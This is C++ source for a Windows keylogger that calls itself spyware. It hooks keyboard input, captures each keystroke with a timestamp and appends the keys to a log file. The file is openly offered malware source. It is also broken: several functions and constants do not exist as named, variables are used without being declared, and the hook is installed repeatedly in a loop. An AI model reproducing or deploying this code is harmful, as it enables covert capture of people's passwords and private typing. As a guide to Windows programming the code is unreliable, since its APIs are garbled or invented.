#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <msvcrt.h> // For _wsprintfx and _sleep


// Structure to hold keystroke data
struct KeyStrokeData {
    char key;
    int timestamp;
};

// Global vector for keystrokes
std::vector<KeyStrokeData> strokes;

// Function to capture a single keystroke
void CaptureKeystroke() {
    // Get the pressed key
    char key = _wsprintfx("%c", 0);  // Use wsprintfx for character input

    // Get the timestamp
    int timestamp = GetTickCount();

    // Add the keystroke to the vector
    strokes.push_back({ key, timestamp });
}


// Function to check if a file exists (for easy logging)
bool FileExists(const char* filename) {
    FILE *file;
    return (fopen(filename, "r") != NULL);
}


// Function to write the keystrokes to a log file.  Uses the application data directory for storage.
void LogKeystrokes() {
    char filePath[256];
    if (GetModuleFileName(NULL, filePath, 256) == NULL) {
        return; // Error occurred, return
    }

    // Construct the full log file path (e.g., C:\Program Files\MySpy\log.txt)
    char* dir = _fullpath(filePath, &filePath[strlen(filePath)]);

    if (dir == NULL) {
        return; // Error occurred, return
    }


    std::string filename = "log.txt";  // Change this if you prefer a different name
    std::string filePathString = std::string(dir) + "\\" + filename;
    
    // Check if file exists before writing to prevent errors
    if (!FileExists(filePathString.c_str())) {
        return; // Exit function as file does not exist
    }


    FILE* file = fopen(filePathString.c_str(), "a");  // Open the log file in append mode

    if (file == NULL) {
        // Error opening the log file, return without writing
        return;
    }

    char timestampStr[16];
    sprintf_s(timestampStr, sizeof(timestampStr), "%d", GetTickCount());  // Use sprintf_s for char arrays


    // Write the keystroke information to the file, using a separator.
    char line[128];
    sprintf_s(line, sizeof(line), "%d,%c\n", timestamp, key);

    if (fputs(line, file) == NULL) {
        fclose(file);
        return;
    }


    printf("Log entry written: %s\n", line); // Optional feedback to the user.

    fclose(file);  // Close the log file
}


int main() {
    // 1. Keyboard Hooks
    for (int i = 0; i < 256; ++i) {
        SetWindowsHookEx(WHC_KEYBOARD, (HOOKPROC)&KeyStrokeHandler, NULL, 0); // Set hook for all keys
    }

    printf("Spyware running... Press Ctrl+Shift+Enter to exit.\n");

    // Keep the program running until the user presses Ctrl+Shift+Enter
    while (_kbhit()) {
        char key = _getch();  // Get next keystroke
        CaptureKeystroke(); // Add to vector
        LogKeystrokes();   // Write to file
    }

    printf("Keylogger finished.\n");

    return 0;
}


// 2. Keyboard Hook Handler Function (prototype)
LRESULT CALLBACK KeyStrokeHandler(int nMessage, WPARAM wParam, LPARAM lParam){
    switch (nMessage) {
        case WM_CHAR: {
            char key = static_cast<char>(wParam);
            CaptureKeystroke(); // Add to vector
            return 0;
        }
        default:
            return CallBackFunction(nMessage, wParam, lParam);
    }
}

